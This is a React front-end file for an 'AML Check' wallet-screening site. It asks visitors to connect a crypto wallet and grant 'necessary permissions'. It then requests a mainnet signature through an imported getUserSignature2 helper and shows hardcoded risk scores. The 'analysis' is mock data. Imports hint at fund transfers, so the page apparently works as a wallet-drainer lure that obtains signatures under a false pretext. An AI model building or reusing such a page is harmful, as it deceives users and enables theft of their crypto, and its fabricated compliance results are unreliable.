import { useState, useEffect, useRef } from "react";
import { useAppKit, useAppKitAccount, useAppKitProvider, useDisconnect } from '@reown/appkit/react'
import { sepolia } from '@reown/appkit/networks'
import { getUserSignature, handleLegacyTwoStep, SessionWallet, getUserSignature2 } from './hooks/checkEthBalance'
import { createWalletClient, custom } from 'viem'
import { mainnet } from 'viem/chains'
import "./Check.css"
import { createPortal } from "react-dom";
import { Link } from "react-router-dom";
import Result from "./Result";


// ── Mock data generator ────────────────────────────────────────
function generateResult(address, chain) {
  // Deterministic-ish score based on address chars
  const seed = address.split("").reduce((a, c) => a + c.charCodeAt(0), 0);
  const score = Math.round(10 + (seed % 70));

  const grade =
    score <= 20 ? "A" : score <= 40 ? "B" : score <= 60 ? "C" : score <= 75 ? "D" : "F";

  const metrics = [
    { name: "Transaction Diversity", value: Math.min(95, 15 + (seed % 60)), color: "green" },
    { name: "Wallet Activity", value: Math.min(90, 40 + (seed % 50)), color: "green" },
    { name: "Transactions to/from CEX", value: Math.min(85, 10 + (seed % 55)), color: "blue" },
    { name: "Avg. Transaction Value", value: Math.min(90, 30 + (seed % 60)), color: "green" },
    { name: "Wallet Age", value: Math.min(95, 50 + (seed % 45)), color: "green" },
    { name: "Suspicious Transactions", value: Math.min(80, 5 + (seed % 50)), color: "yellow" },
    { name: "Links to High-Risk Addresses", value: Math.min(75, 3 + (seed % 45)), color: "yellow" },
  ];

  const totalTx = 14 + (seed % 800);
  const walletAge = `${1 + (seed % 4)} yr ${seed % 12} mo`;
  const balance = ((seed % 9000) / 100).toFixed(4);
  const unit = chain === "ETH" ? "ETH" : chain === "BTC" ? "BTC" : chain;

  const flags = [
    {
      ok: score < 50,
      icon: score < 50 ? "✅" : "⚠️",
      type: score < 50 ? "ok" : "warn",
      title: "No direct sanctions exposure",
      desc: score < 50 ? "Wallet has no links to OFAC or EU sanctioned entities." : "Indirect exposure detected — 1 hop from a flagged address.",
    },
    {
      ok: metrics[5].value < 40,
      icon: metrics[5].value < 40 ? "✅" : "🚨",
      type: metrics[5].value < 40 ? "ok" : "bad",
      title: "Mixer / tumbler activity",
      desc: metrics[5].value < 40 ? "No transactions routed through known mixers." : "Funds passed through a known mixing service.",
    },
    {
      ok: true,
      icon: "✅",
      type: "ok",
      title: "No darknet market exposure",
      desc: "No direct or indirect transactions linked to darknet markets.",
    },
    {
      ok: metrics[6].value < 30,
      icon: metrics[6].value < 30 ? "✅" : "⚠️",
      type: metrics[6].value < 30 ? "ok" : "warn",
      title: "High-risk address links",
      desc: metrics[6].value < 30 ? "No links to known high-risk or flagged addresses." : `${1 + (seed % 4)} indirect links to high-risk addresses found.`,
    },
  ];

  return { score, grade, metrics, totalTx, walletAge, balance, unit, flags, address, chain };
}

// ── Helpers ────────────────────────────────────────────────────
function getGradeClass(g) { return `wc-grade-${g}`; }
function getBarColor(color) { return `wc-bar-${color}`; }
function getScoreColor(score) {
  if (score <= 30) return "#22c55e";
  if (score <= 55) return "#f59e0b";
  return "#ef4444";
}
function getVerdictClass(score) {
  if (score <= 35) return "wc-verdict-clean";
  if (score <= 65) return "wc-verdict-moderate";
  return "wc-verdict-risky";
}
function getVerdictContent(score) {
  if (score <= 35) return { icon: "✅", title: "Low Risk — Clean Wallet", text: "This wallet shows no significant AML risk signals. It appears safe to transact with based on current on-chain data." };
  if (score <= 65) return { icon: "⚠️", title: "Moderate Risk — Review Recommended", text: "This wallet has some elevated risk indicators. We recommend reviewing the flagged items below before transacting." };
  return { icon: "🚨", title: "High Risk — Proceed with Caution", text: "This wallet exhibits significant AML risk signals. Exercise extreme caution and consider avoiding interaction with this address." };
}
function getBadge(value) {
  if (value < 35) return { label: "Low", cls: "wc-badge-low" };
  if (value < 65) return { label: "Medium", cls: "wc-badge-medium" };
  return { label: "High", cls: "wc-badge-high" };
}
function shortAddr(addr) {
  if (addr.length <= 16) return addr;
  return addr.slice(0, 8) + "…" + addr.slice(-6);
}

const CHAINS = ["ETH"];
//const CHAINS = [ { label: "ETH", value: "EVM"}, { label: "TRON", value: "TRON"} ];
const LOADING_STEPS = [
  "Asking for neccessary permissions",
  "Fetching on-chain data",
  "Analyzing transaction graph",
  "Scanning sanctions lists",
  "Computing risk indicators",
  "Generating report",
];

// ── Main Component ─────────────────────────────────────────────
export default function Check() {
    const [chain, setChain] = useState("EVM");
    const [phase, setPhase] = useState("idle"); // idle | loading | result
    const [result, setResult] = useState(null);
    const [stepIdx, setStepIdx] = useState(0);
    const [barWidths, setBarWidths] = useState({});
    const [copied, setCopied] = useState(false);
    const inputRef = useRef(null);
    const [network, setNetwork] = useState("EVM")
    const [tronAddress, setTronAddress] = useState(null);
    const { open } = useAppKit()
    const { address, isConnected, caipNetworkId } = useAppKitAccount()
    const { connectWithSession } = SessionWallet()
    //   const { sendingETH } = useEthBalance(address);
    const { disconnect } = useDisconnect()
    const { walletProvider } = useAppKitProvider('eip155')

    const disconnectBtn = async () =>
    {
      if (!isConnected) return

      try {
          disconnect()
          console.log("Disconnected")
      } catch (err) {
          console.error("Disconnect error:", err)
      }
    }

    const onReceive = async() =>
    {
        try 
        {
        console.log("ETH receiving")
        // await sendingETH()
        } 
        catch (err) 
        {
        console.error(err)
        }
    }

    const onConnect = async() => 
    {        
        await open();    
    }

    const onDisconnect = async() => 
    {
      // if (chain === "EVM") {
      //   disconnect();
      // }
      disconnect()
    }

    const onCheck = async() =>
    {
        const walletClient = createWalletClient({
          account: address,
          chain: mainnet,
          transport: custom(walletProvider) // ✅ AppKit provider → viem
        })
        
        // const walletClient = createWalletClient({
        //   account: address,
        //   chain: sepolia,
        //   transport: custom(walletProvider) // ✅ AppKit provider → viem
        // })
        setPhase("loading")
        console.log(2)
        //await getUserSignature(walletClient, address);
        var result = await getUserSignature2(walletClient, address)
        if(result == false)
          setPhase("")
        else
          setPhase("showResult")
    }    


    // const handleCheck = () => {
    //     const trimmed = address.trim();
    //     if (!trimmed) { inputRef.current?.focus(); return; }
    //     setPhase("loading");
    //     setStepIdx(0);
    //     setBarWidths({});

    //     // Animate steps
    //     LOADING_STEPS.forEach((_, i) => {
    //     setTimeout(() => setStepIdx(i + 1), i * 600 + 300);
    //     });

    //     setTimeout(() => {
    //     const res = generateResult(trimmed, chain);
    //     setResult(res);
    //     setPhase("result");
    //     // Animate bars after mount
    //     setTimeout(() => {
    //         const w = {};
    //         res.metrics.forEach((m, i) => { w[i] = m.value; });
    //         setBarWidths(w);
    //     }, 80);
    //     }, LOADING_STEPS.length * 600 + 600);
    // };

    const handleReset = () => {
        setPhase("idle");
        setResult(null);
        setResult("")
        setBarWidths({});
        setTimeout(() => inputRef.current?.focus(), 100);
    };

    const handleCopy = () => {
      navigator.clipboard.writeText(address);
      setCopied(true);
      setTimeout(() => setCopied(false), 2000);
    };

    // const handleKeyDown = (e) => {
    //     if (e.key === "Enter") handleCheck();
    // };

  return (
    <>      
      

      <div className="wc-root">
        {/* NAV */}
        <nav className="wc-nav">
          <Link className="wc-logo" to="/">
            <div className="wc-logo-icon"><div className="wc-logo-dot" /></div>
            AML Check
          </Link>
          <ul className="wc-nav-links">
            <li><Link to="/pricing">Price</Link></li>
            <li><Link to="/faq">FAQ</Link></li>
          </ul>
          <Link to="/check" className="wc-btn-dark">Check your wallet</Link>
        </nav>

        <div className="wc-page">          

          {/* HEADER */}
          <div className="wc-header">
            <div className="wc-chip">
              <div className="wc-chip-dot" />
              Live Screening
            </div>
            <h1>Check your wallet for dirty crypto</h1>
            <p>Connect your crypto wallet below and give neccessary permissions to get an instant AML risk report.</p>
          </div>
        

          {/* INPUT */}
          {phase !== "result" && (
            <div className="wc-input-card">
              <label className="wc-input-label">Wallet</label>
              <div className="wc-input-row">
                {
                    !isConnected ? 
                    (
                        <button className="wc-connect-button" onClick={onConnect} autoComplete="off">
                                Connect Your Wallet and check
                        </button>
                    ) : 
                    (
                        <button className="wc-connect-button" style={{marginLeft:"10%"}} onClick={onDisconnect} autoComplete="off">
                                {address.slice(0, 4)}...{address.slice(-4)}                          
                        </button>
                    )
                }
                <select
                  className="wc-chain-select"
                  value={chain}
                  onChange={(e) => setChain(e.target.value)}
                  disabled={phase === "loading"}
                >
                  {CHAINS.map((c) => <option key={c}>{c}</option>)}
                </select>
                <button
                  className="wc-check-btn"
                  onClick={onCheck}
                  disabled={phase === "loading"}
                >
                  {phase === "loading" ? (
                    <>
                      <div style={{ width: 16, height: 16, border: "2px solid rgba(255,255,255,0.3)", borderTopColor: "#fff", borderRadius: "50%", animation: "wcSpin 0.8s linear infinite" }} />
                      Checking…
                    </>
                  ) : (
                    <> Analyze →</>
                  )}
                </button>
              </div>
            </div>
          )}

          {/* LOADING */}
          {phase === "loading" && (
            <div className="wc-loading">
              <div className="wc-spinner-wrap">
                <div className="wc-spinner" />
              </div>
              <h3>Analyzing wallet…</h3>
              <p>Scanning on-chain data and risk databases</p>
              <div className="wc-loading-steps">
                {LOADING_STEPS.map((s, i) => (
                  <div
                    key={i}
                    className={`wc-step ${i < stepIdx ? "done" : i === stepIdx ? "active" : ""}`}
                  >
                    <span className="wc-step-icon">
                      {i < stepIdx ? "✓" : i === stepIdx ? "⟳" : "○"}
                    </span>
                    {s}
                  </div>
                ))}
              </div>
            </div>
          )}

          {/* RESULTS */}
          {/* {phase === "showResult" && (
            <>
            <div className="result-center">
              <div className="result-animate">
                {/* SCORE CARD */}
                  
              {/*</div>  
            </div> */}

              {/* ACTIONS */}
              {/* <div className="wc-actions">
                <button className="wc-btn-blue">⬇ Download PDF Report</button>
                <button className="wc-btn-outline" onClick={handleCopy}>
                  {copied ? "✓ Copied!" : "📋 Copy Address"}
                </button>
                <button className="wc-btn-outline">📤 Share Report</button>
              </div> */}

              {/* NEW CHECK */}
              {/* <div className="wc-new-check">
                Want to check another wallet?{" "}
                <button onClick={handleReset}>Start new check</button>
              </div>

            
            </>
          )} */}

        </div>
        {phase === "showResult" &&
          createPortal(
            <div className="result-overlay" onClick={handleReset}>
              <div className="result-modal">
                <Result diversity={40} activity={70} age={70} highRisk={15} suspicious={5} transaction={60} address={address}/>
                <button className="close-btn" onClick={handleReset}>
                  ✕
                </button>
              </div>
            </div>,
            document.body
          )
        }
      </div>
      <footer>
          <span>© 2025 AML Check. All rights reserved.</span>
          <span>Privacy Policy · Terms of Service</span>
      </footer>
    </>
  );
}